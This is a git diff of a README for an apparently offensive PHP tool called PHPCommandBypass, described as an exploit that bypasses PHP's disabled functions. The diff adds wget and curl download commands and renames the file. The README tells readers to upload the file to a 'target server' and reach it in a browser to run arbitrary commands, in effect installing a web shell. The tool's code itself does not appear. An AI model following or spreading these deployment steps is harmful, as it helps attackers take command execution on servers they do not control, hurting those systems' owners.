@@ -45,26 +45,29 @@ git clone https://github.com/JawaTengahXploit1337/PHPCommandBypass
 cd PHPCommandBypass
 
 # Upload the PHP file to your target server
-cp exploit.php /var/www/html/bypass.php
+cp cmdbyp.php /var/www/html/cmdbyp.php
 ```
 
 ### Method 2: Wget & Curl Files (Alternative)
 ```bash
-# Not available via Composer - direct file upload required
+wget https://raw.githubusercontent.com/JawaTengahXploit1337/PHPCommandBypass/main/cmdbyp.php
+```
+```bash
+curl -O https://raw.githubusercontent.com/JawaTengahXploit1337/PHPCommandBypass/main/cmdbyp.php
 ```
 
 ## 🛠 Usage
 
 ### Web Interface
-1. Upload `cmdbypass.php` to your target server
-2. Access the file via web browser: `http://target.com/cmdbypass.php`
+1. Upload `cmdbyp.php` to your target server
+2. Access the file via web browser: `http://target.com/cmdbyp.php`
 3. Enter commands in the input field
 4. View results in the output panel
 
 ### Direct PHP Execution
 ```php
 <?php
-include 'cmdbypass.php';
+include 'cmdbyp.php';
 // The exploit auto-executes when accessed via web interface
 ?>
 ```
@@ -113,7 +116,7 @@ netstat -tuln
 ```
 php-disable-functions-bypass/
 │
-├── cmdbypass.php          # Main cmdbypass file
+├── cmdbyp.php          # Main cmdbypass file
 ├── README.md           # This documentation
 ├── LICENSE            # MIT License
 └── examples/          # Usage examples
@@ -127,8 +130,8 @@ Contributions are welcome! Please feel free to submit pull requests or open issu
 
 ### Development Setup
 ```bash
-git clone https://github.com/JavaXploiter/php-disable-functions-bypass.git
-cd php-disable-functions-bypass
+git clone https://github.com/JawaTengahXploit1337/PHPCommandBypass.git
+cd PHPCommandBypass
 
 # Set up testing environment
 docker run -it -v $(pwd):/var/www/html -p 8080:80 php:7.4-apache
